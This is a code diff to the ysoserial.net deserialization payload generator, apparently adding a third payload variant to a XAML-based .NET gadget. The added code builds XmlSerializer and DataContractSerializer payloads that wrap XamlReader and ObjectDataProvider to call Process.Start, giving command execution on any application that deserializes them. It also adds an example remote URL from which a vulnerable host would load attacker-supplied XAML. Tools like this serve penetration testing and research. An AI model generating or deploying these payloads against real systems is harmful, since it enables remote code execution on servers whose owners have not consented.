@@ -37,7 +37,7 @@ namespace ysoserial.Generators
             OptionSet options = new OptionSet()
             {
                 {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, or 3 based on formatter.", v => int.TryParse(v, out variant_number) },
-                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
             };
 
             return options;
@@ -91,7 +91,9 @@ namespace ysoserial.Generators
                 {
                     ResourceDictionary myResourceDictionary = new ResourceDictionary();
                     myResourceDictionary.Add("", odp);
-                    payload = XamlWriter.Save(myResourceDictionary);
+                    //payload = XamlWriter.Save(myResourceDictionary);
+                    payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
+
                 }
                 else if(variant_number == 3)
                 {
@@ -103,10 +105,12 @@ namespace ysoserial.Generators
                     }
                     
                     payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
+                    
                 }
                 else
                 {
-                    payload = XamlWriter.Save(odp);
+                    //payload = XamlWriter.Save(odp);
+                    payload = SerializersHelper.Xaml_serialize(odp);
                 }
                 
                 if (inputArgs.Minify)
@@ -315,7 +319,7 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root");
+                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root", "type");
                     }
                     catch (Exception err)
                     {
@@ -352,6 +356,27 @@ namespace ysoserial.Generators
             <a:MethodParameters>
                 <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                     <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
+                </anyType>
+            </a:MethodParameters>
+            <a:ObjectInstance z:Ref=""ref1""/>
+        </ProjectedProperty0>
+    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
+</root>
+";
+                }
+                else if (variant_number == 3)
+                {
+                    payload = $@"<?xml version=""1.0""?>
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
+      <ExpandedElement z:Id=""ref1"" >
+        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
+      </ExpandedElement>
+        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
+            <a:MethodName>Parse</a:MethodName>
+            <a:MethodParameters>
+                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
+                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">xxxxx</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                 </anyType>
             </a:MethodParameters>
             <a:ObjectInstance z:Ref=""ref1""/>
@@ -402,7 +427,7 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                     }
                     catch (Exception err)
                     {
